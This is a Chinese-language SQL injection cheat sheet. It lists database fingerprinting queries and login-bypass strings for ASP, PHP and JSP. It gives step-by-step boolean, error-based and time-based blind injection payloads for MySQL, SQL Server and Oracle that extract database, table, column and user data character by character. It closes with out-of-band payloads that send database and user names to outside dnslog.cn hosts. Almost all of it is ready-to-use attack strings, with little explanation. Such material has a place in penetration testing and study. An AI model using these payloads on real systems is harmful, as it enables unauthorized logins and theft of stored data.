注入方法
========================================

数据库类型检测
----------------------------------------

acess
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- ``and exists (select * from msysobjects ) > 0``

MySQL
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- sleep 
	- ``sleep(1)``
- benchmark
	- ``BENCHMARK(5000000, MD5('test'))``
- 字符串连接
	- ``select 'ab'='a' 'b'``
	- ``select 'ab'=CONCAT('a','b')``
- version 
    - ``SELECT @@version``
    - ``SELECT version()``
- 数字函数
    - ``connection_id()``
    - ``last_insert_id()``
    - ``row_count()``

Oracle
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- 字符串连接 
    - ``select 'ab'='a'||'b'``
    - ``select 'ab'=CONCAT('a','b')``
- version 
    - ``SELECT banner FROM v$version``
    - ``SELECT banner FROM v$version WHERE rownum=1``
- 数字函数
	- ``BITAND(1,1)``

SQLServer
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- WAITFOR 
	- ``WAITFOR DELAY '00:00:10';``
- SERVERNAME
	- ``SELECT @@SERVERNAME``
- version
	- ``SELECT @@version``
- 字符串连接
	- ``select 'a'+'b'='ab'``
- 常量
    - ``@@pack_received``
    - ``@@rowcount``
- other
	- ``and exists (select * from sysobjects ) > 0``

PostgreSQL
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- ``pg_sleep(1)``
- ``select version()``
- ``select 'ab'='a'||'b'``
- ``select 'ab'=CONCAT('a','b')``
- ``SELECT EXTRACT(DOW FROM NOW())``

万能密码
-----------------------------------------
- asp aspx万能密码

	``" or "a"="a``
	``') or ('a'='a``
	``or 1=1--``
	``' or 1=1--``
	``a' or '1=1--``
	``" or 1=1--``
	``' or 'a'='a``
	``" or "="a'='a``
	``' or ''='``
	``' or '='or'``
	``1 or '1'='1'=1``
	``1 or '1'='1' or 1=1``
	``' OR 1=1%00``
	``" or 1=1%00``
	``' xor``
	``用户名 ' UNION Select 1,1,1 FROM admin Where ''=' （替换表名admin）``
	``密码 1``
	``admin' or 'a'='a 密码随便``

- PHP万能密码

	``'or 1=1/*``
	``User: something``
	``Pass: ' or '1'='1``

- jsp 万能密码

	``1' or '1'='1``
	``admin' or 1=1/*``
	
mysql盲注
--------------------------------------

常用函数
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- length() #返回字符串的长度，例如可以返回数据库名字的长度 
- substr() #用来截取字符串 
- ascii() #返回字符的ascii码
- sleep(n) #将程序挂起⼀段时间，n为n秒
- if(expr1,expr2,expr3) #判断语句 如果第⼀个语句正确就执⾏第⼆个语句如果错误执⾏第三个语句

基于布尔SQL盲注-----构造逻辑判断 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- 猜解数据库名长度
	+ ``id=1' and length(database())>8#``
- 二分法猜解数据库名
	+ ``id=1' and ascii(substr(database(),1,1))>97#``
- 猜解数据库表个数
	+ ``id=1' and (select count(table_name) from information_schema.tables where table_schema=database())>1#``
- 猜解表名长度
	+ ``id=1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9#``
- 猜解表名
	+ 猜解第一张表第一个字符：``id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=103#``
	+ 猜解第一张表第n个字符：``id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),n,1))=103#``
	+ 猜解第m张表第n个字符：``id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit m-1,1),n,1))=103#``
- 猜解字段数量
	+ ``id=1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='users')=3 #``
- 猜解字段长度
	+ 猜解第一个字段长度：``id=1' and length(substr((select column_name from information_schema.columns where table_schema=database() and table_name= 'users' limit 0,1),1))=2 #``
	+ 猜解第n个字段长度：``id=1' and length(substr((select column_name from information_schema.columns where table_schema=database() and table_name= 'users' limit n-1,1),1))=7 #``
- 猜解字段名
	+ 猜解第一个字段的第一个字符：``id=1' and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name= 'users' limit 0,1),1,1))=105 #``
	+ 猜解第m个字段的第n个字符：``id=1' and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name= 'users' limit m-1,1),n,1))=105 #``
- 猜解字段数据
	+ 猜解users表下username字段的第一处数据的第一个字符：``id=1' and ascii(substr((select username from security.users limit 0,1),1,1))=97 #``
	+ 猜解users表下username字段的第m处数据的第n个字符：``id=1' and ascii(substr((select username from security.users limit m-1,1),n,1))=97 #``
- 暴力猜解username字段是否存在admin用户
	+ ``1' and (select count(*) from security.users where username = 'admin') = 1 #``
- ``ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))>98%23``
	+ mid(a,b,c)从位置b开始，截取a字符串的c位 
	+ ORD函数为返回第一个字符的ASCII码
- regexp正则注入
	+ ``select * from users where id=1 and 1=(if((user() regexp '^r'),1,0));``
	+ 当正确的时候显示结果为1，不正确的时候显示结果为0. 
- like匹配注入
	+ ``select user() like 'ro%'``
	
基于报错的SQL盲注
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- ``Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a;``
	+ ``select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2))``
- ``select exp(~(select * FROM(SELECT USER())a))``
	+ double数值类型超出范围,Exp()为以e为底的对数函数；版本在5.5.5及其以上
- ``select !(select * from (select user())x) - ~0``
	+ bigint超出范围；~0是对0逐位取反，很大的版本在5.5.5及其以上
- ``extractvalue(1,concat(0x7e,(select @@version),0x7e))``
- ``updatexml(1,concat(0x7e,(select @@version),0x7e),1)``
	+ mysql对xml数据进行查询和修改的xpath函数，xpath语法错误
- ``select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;``
	+ mysql重复特性，此处重复了version，所以报错
	
基于时间的SQL盲注----------延时注入
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- 关键语句：if判断语句，条件为假，执行sleep
	+ ``If(ascii(substr(database(),1,1))>115,0,sleep(5))%23``
- ``UNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE('MSG','by 5 seconds')),null) FROM (select database() as current) as tb1;``
	+ BENCHMARK(count,expr)用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。
- 猜解数据库名
	+ id=1' and if(ascii(substr(database(),1,1))>97,sleep(5),1)#
- 猜解表的数量
	+ ``id=1' and if((select count(table_name) from information_schema.tables where table_schema=database())=4,sleep(5),1)#``
- 猜解表名长度
	+ 猜测第一张表名长度：``id=1' and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6,sleep(5),1)#``
	+ 猜测第n张表名长度：``id=1' and if(length((select table_name from information_schema.tables where table_schema=database() limit n-1,1))=6,sleep(5),1)#``
- 猜解表名
	+ 猜测第一张表名的第一个字符：``id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>101,sleep(5),1)#``
	+ 猜测第m张表名的第n个字符：``id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit m-1,1),n,1))>101,sleep(5),1)#``
- 猜解字段的数量
	+ ``id=1' and if((select count(column_name) from information_schema.columns where table_name=0x656D61696C73 )=2,sleep(5),1)#``
- 猜解列的长度
	+ ``id=1' and if(length((select column_name from information_schema.columns where table_schema=database() and table_name=0x656D61696C73 limit 0,1))=2,sleep(5),1)#``
- 猜解列名
	+ 猜解第一列的第一个字符：``id=1' and if(ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=0x656D61696C73 limit 0,1 ),1,1))=105,sleep(5),1)#``
	+ 猜解第m列的第n个字符：``id=1' and if(ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=0x656D61696C73 limit m-1,1 ),n,1))=105,sleep(5),1)#``
- 猜解列中有多少行数据
	+ ``id=1' and if((select count(*) from security.users)=14,sleep(5),1)#``
- 猜解列中的数据
	+ ``id=1' and if(ascii(substr((select username from security.users limit 0,1),1,1))=119,sleep(5),1)#``

mssql盲注
--------------------------------------

布尔盲注
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- 测试数据库名个数
	+ ``id=1 and 1=(select count(*) from master.dbo.sysdatabases where dbid=5)``
- 根据dbid字段猜库名长度
	+ ``id=1 and 1=(select count(*) from master.dbo.sysdatabases where dbid=5 and len(name)>4)``
- 根据dbid字段挨个查询数据库名
	+ ``id=1 and ascii(substring((select top 1 name from master.dbo.sysdatabases where dbid=5),1,1)) >81``
	+ 查询数据库名第一个字符
- 查表名长度
	+ 查当前数据库第一个表名长度：``id=1 and 1=(select count(*) from sysobjects where name in (select top 1 name from sysobjects where xtype='u') and len(name)>22)``
	+ 查当前数据库第二个表名长度: ``id=1 and 1=(select count(*) from sysobjects where name in (select top 1 name from sysobjects where xtype='u' and name != 'Portal_Announcementscat')  and len(name)=20)``
	+ 查数据库DianCMS第一个表名长度：``id=1 and 1=(select count(*) from DianCMS.dbo.sysobjects where name in (select top 1 name from DianCMS.dbo.sysobjects where xtype='u') and len(name)>1)``
- 猜解表名
	+ 猜解表名第一个字符：``id=1 and 1=(select count(*) from sysobjects where name in (select top 1 name from sysobjects where xtype='u') and ascii(substring(name,1,1))=80)``
	+ 猜解其他表：``id=1 and 1=(select count(*) from sysobjects where name in (select top 1 name from sysobjects where xtype='u' and name not in ('Portal_Announcementscat','Portal_Announcements')) and ascii(substring(name,1,1))=117)``
- 猜解列名长度
	+ ``id=1 and exists(select top 1 name from syscolumns where id =(select id from sysobjects where name = 'Portal_Announcementscat') and len(name)=5)``
	+ ``id=1 and 1=(select count(*) from syscolumns where id = (select id from sysobjects where name = 'Portal_Announcementscat')  and len(name)=5)``
	+ 猜解其他列名长度：``id=1 and exists(select top 1 name from syscolumns where id =(select id from sysobjects where name = 'Portal_Announcementscat') and name not in ('catid') and len(name)=8)``
- 猜解列名
	+ 猜解列名第一个字符：``id=1 and ascii(substring((select top 1 name from syscolumns where id=(select id from sysobjects where xtype=0x75 and name='Portal_Announcementscat')),1,1)) =99``
	+ 猜解列名第一个字符：``id=1 and exists(select top 1 name from syscolumns where id =(select id from sysobjects where name = 'Portal_Announcementscat') and unicode(substring(name,1,1))=99)``
	+ 猜解其他列名：``id=1 and ascii(substring((select top 1 name from syscolumns where id=(select id from sysobjects where xtype=0x75 and name='Portal_Announcementscat') and name not in ('catid')),1,1)) =109``
- 猜解数据
	+ 猜解opusername列第一个字符：``id=1 and ascii(substring((select top 1 opusername from Portal_Announcementscat),1,1)) = 97``
	
时间盲注
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- 判断是否存在时间盲注
	+ ``id=1 WAITFOR DELAY '0:0:5'--``
- 判断数据库名是否存在
	+ dbid逐渐+1：``id=1 if ((select count(*) from master.dbo.sysdatabases where dbid=5)=1) waitfor delay '0:0:3'--``
- 猜解库名长度
	+ ``id=1 if ((select count(*) from master.dbo.sysdatabases where dbid=9 and len(name)=2)=1) waitfor delay '0:0:5'--``
- 猜数据库名
	+ ``id=1 if (ascii(substring((select top 1 name from master.dbo.sysdatabases where dbid=9),1,1)) = 111) WAITFOR DELAY '0:0:5'--``
	+ ``id=1 if (ascii(substring((select top 1 name from master.dbo.sysdatabases where dbid=9),2,1)) = 97) WAITFOR DELAY '0:0:5'--``
- 猜解表名长度
	+ ``id=1 if ((select count(*) from oa.dbo.sysobjects where name in (select top 1 name from oa.dbo.sysobjects where xtype='u') and len(name)=23)=1) WAITFOR DELAY '0:0:5'--``
	+ ``id=1 if ((select count(*) from oa.dbo.sysobjects where name in (select top 1 name from oa.dbo.sysobjects where xtype='u' and name not in ('Portal_Announcementscat')) and len(name)=20)=1) WAITFOR DELAY '0:0:5'--``
- 猜解表名
	+ ``id=1 if ((select count(*) from oa.dbo.sysobjects where name in (select top 1 name from oa.dbo.sysobjects where xtype='u') and ascii(substring(name,1,1))=80)=1) WAITFOR DELAY '0:0:5'--``
	+ ``id=1 if ((select count(*) from oa.dbo.sysobjects where name in (select top 1 name from oa.dbo.sysobjects where xtype='u' and name not in ('Portal_Announcementscat')) and ascii(substring(name,1,1))=80)=1) WAITFOR DELAY '0:0:5'--``
- 猜解列名长度
	+ ``id=1 if(exists(select top 1 name from oa.dbo.syscolumns where id =(select id from oa.dbo.sysobjects where name = 'Portal_Announcementscat') and len(name)=5)) WAITFOR DELAY '0:0:5'--``
	+ ``id=1 if((select count(*) from oa.dbo.syscolumns where id =(select id from oa.dbo.sysobjects where name = 'Portal_Announcementscat') and len(name)=5)>0) WAITFOR DELAY '0:0:5'--``
	+ 猜解其他列名长度：``id=1 if(exists(select top 1 name from oa.dbo.syscolumns where id =(select id from oa.dbo.sysobjects where name = 'Portal_Announcementscat') and name not in ('catid') and len(name)=8)) WAITFOR DELAY '0:0:5'--``
- 猜解列名
	+ 猜解列名第一个字符：``id=1 if (ascii(substring((select top 1 name from syscolumns where id=(select id from sysobjects where xtype=0x75 and name='Portal_Announcementscat')),1,1)) =99) WAITFOR DELAY '0:0:5'--``
	+ 猜解其他列名：``id=1 if (ascii(substring((select top 1 name from syscolumns where id=(select id from sysobjects where xtype=0x75 and name='Portal_Announcementscat') and name not in ('catid')),1,1)) =109) WAITFOR DELAY '0:0:5'--``
- 猜解数据
	+ ``id=1 if (ascii(substring((select top 1 opusername from Portal_Announcementscat),1,1)) = 97) WAITFOR DELAY '0:0:5'--``
	
OBB带外注入
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- ``id=1 and exists(select * from fn_trace_gettable('\\'+(select top 1 name from master..sysdatabases where dbid>4)+'.6etys1.dnslog.cn\1.trc',default))``

Oracle盲注
--------------------------------------

布尔盲注
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- 猜用户名(substr)
	+ ``id=1' and (select substr(user,1,1) from dual)='S' --``
	+ ``id=1' and (select substr(user,2,1) from dual)='C' --``
	+ ``id=1' and 666=(case when ascii(substr(user,1,1))=83 then '666' else '555' end)--``
- 猜解表名(substr)
	+ ``id=1' and (select substr((select table_name from user_tables where rownum=1),1,1) from dual)='D' --``
- 猜解列名(substr)
	+ ``id=1' and (select substr((select column_name from user_tab_columns where table_name='USERS' and rownum=1),1,1) from dual)='I' --``
- 猜解数据(substr)
	+ ``id=1' and (select substr((select name from users where rownum=1),1,1) from dual)='x' --``
- 猜解用户名(decode)
	+ ``id=1' and 1=(select decode(substr(user, 1, 1), 'S', (1/1),0) from dual) --``
- 猜解表名(decode)
	+ ``id=1' and 1=(select decode(substr((select table_name from user_tables where rownum=1),1,1),'D',(1),0) from dual)--+``
- 猜解用户名(instr)
	+ ``id=1'and 1=(instr((select user from dual),'SCOTT')) --``
	
时间盲注
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- 猜解用户名
	+ ``id=1' and (select decode(substr(user,1,1),'S',dbms_pipe.receive_message('cc',5),0) from dual) is not null--``
	+ ``id=1' and 1=(select decode(substr(user,1,1),'S',dbms_pipe.receive_message('RDS',10),0) from dual) --``
- 猜解用户名(REPLACE)
	+ ``id=1' and 1=DBMS_PIPE.RECEIVE_MESSAGE('cc', REPLACE((SELECT substr(user, 1, 1) FROM dual), 'S', 5))--``
- 猜解用户名(利用获取大量数据的语句造成时间盲注)
	+ ``id=1' and (select decode(substr(user,1,1),'S',(select count(*) from all_objects),0) from dual) is not null--``

OOB外带
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- 前提:需要有发起网络请求的权限
- ``id=1' and (select utl_inaddr.get_host_address((select user from dual)||'.u436mi.dnslog.cn') from dual) is not null--``
- ``id=1' and (select SYS.DBMS_LDAP.INIT((select user from dual)||'.1tu2me.dnslog.cn',80) from dual) is not null--``
- ``id=1' and (SELECT HTTPURITYPE((select user from dual)||'.vob8hd.dnslog.cn').GETCLOB() FROM DUAL) is not null--``